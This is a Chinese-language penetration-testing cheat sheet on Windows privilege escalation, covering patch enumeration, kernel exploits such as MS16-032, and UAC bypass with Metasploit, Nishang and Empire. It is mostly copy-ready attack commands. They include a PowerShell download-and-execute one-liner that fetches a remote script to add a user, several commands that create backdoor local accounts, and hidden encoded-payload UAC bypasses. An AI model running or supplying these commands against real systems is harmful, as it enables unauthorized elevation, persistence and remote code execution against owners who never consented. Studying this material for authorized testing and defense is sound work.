## 一、介绍

### 1、权限

```php
	User：普通用户权限
	Administrator：管理员权限
	System：系统权限
	TrustedInstaller：Windows中的最高权限
```

### 2、提权

```
	纵向提权：低权限角色获得高权限角色权限
	横向提权：获取同级别角色的权限
```



## 二、内核溢出

### 1、介绍

```php
# 溢出漏洞
	溢出漏洞就像往杯子里装水———如果水太多，杯子装不下了，就会溢出来。计算机中有个地方叫做缓冲区。程序缓存区的大小是事先设置好的，如果用户输入数据的大小超过了缓存区的大小，程序就会溢出。系统内核溢出漏洞提权是一种通用的提权方法，攻击者通常可以使用该方法绕过系统的所有安全限制。
```

```php
# WMIC
	WMIC（Windows Managerment Instrumentation Command-line），是Windows平台上最有用的命令行工具。使用WMIC，不仅可以管理本地计算机，还可以管理同一域内的所有计算机。
```

### 2、发现缺失补丁_手动

```php
# 查看当前权限
	whoami /groups
```

```php
# 查看补丁编号
	systeminfo
```

```php
# 列出已经安装的补丁
	Wmic qfe get Caption,Description,HotFixID,InstalledOn
```

```php
# 查看指定补丁
	wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3143141" /C:"KB976902"
```

```php
# 存在MS16-032漏洞，使用脚本添加用户1
	..\Invoke-MS16-032.ps1
	Invoke-MS16-032 -Application cmd.exe -Commandline "/C net user 1 1 /add"
```

```php
# 查看当前用户
	net user
```

```php
# 启动"记事本"
	..\Invoke-MS16-032
	Invoke-MS16-032 -Application notepad.exe
```

```php
# 远程执行命令（添加用户2）
	powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('链接');Invoke-MS16-032 -Application cmd.exe -commandline '/c net user 2 test123 /add'"
```

```php
# 查看当前用户
	net user
```

### 3、发现缺失补丁_MSF

```
	> use post/windows/gather/enum_patches
	> show options
	> set SESSION [session id]
	> run
```

### 4、利用_Suggester

```php
# 获取补丁信息
	systeminfo > patches.txt
	type patches.txt
```

```php
# 下载微软安全公告数据库
	./windows-exploit-suggester.py --update
```

```php
# 安装xlrd模块
	pip install xlrd --upgrade
```

```php
# 检查系统中是否存在未修复的漏洞
	./windows-exploit-suggester.py -d 2019-02-02-mssb.xls -i patches.txt
```

```php
# Metasploit找出系统中可能被利用的漏洞
	use post/multi/recon/local_exploit_suggester
	set LHOST [ip]
	set SESSION [sessions id]
	exploit
```

### 5、利用_Sherlock

```php
# 调用Sherlock脚本
	Import-Module C:\Sherlock.ps1
```

```php
# 搜索所有未安装的补丁
	Find-AllVulns
```

```php
# 搜索单个漏洞
	powershell Find-MS14058
```

```php
# elevate提权
	elevate ms14-058
```

```php
# 查看权限
	getuid
```

### 

## 三、绕过UAC

### 1、介绍

```php
# UAC简介
	如果计算机的操作系统版本是Windows Vista或更高，在权限不够的情况下，访问系统磁盘的根目录、Windows目录、Program Files目录，以及读写系统登录数据库的程序等操作，都需要经过UAC（User Account Control，用户账户控制）的认证才能进行。
```

```php
# UAC设置
	始终通知：最严格模式，每当有程序需要使用高级别的权限时都会提示本地用户
	仅在程序试图更改我的计算机时通知我：UAC默认设置
	仅在程序试图更改我的计算机时通知我（不降低桌面的亮度）
	从不提示：当用户为系统管理员时，所有程序都会以最高权限运行
```

### 2、MSF

```php
# bypass模块
	> use exploit/windows/local/bypassuac
	> set session [session id]
	> run
	> getuid
	> getsystem
	> getuid
```

```php
# runas模块
	> use exploit/windows/local/ask
	> set session [session id]
	> run	// 此时目标机器上会弹出UAC对话框，单机"是"按钮，会返回一个新的shell
	> getuid
	> getsystem
	> getuid
```

### 3、Nishang

```php
# Invoke-PsUACme模块
	> Invoke-PsUACme -Verbose	//使用Sysprep方法并执行默认的payload
	> Invoke-PsUACme -method oobe -Verbose	//使用oobe方法并执行默认的payload
	> Invoke-PsUACme -method oobe -Payload "powershell -windowstyle hidden -e [编码过的payload]"	//使用-payload参数，可以自行指定要执行的payload
```

### 4、Empire

```php
# bypassuac模块
	> usemodule privesc/bypassuac
	> set Listener shuteer
	> execute
	> back
	> list
```

```php
# bypassuac_wscript模块
	> usemodule privesc/bypassuac_wscript
	> set Listener test
	> execute
	> agents
```

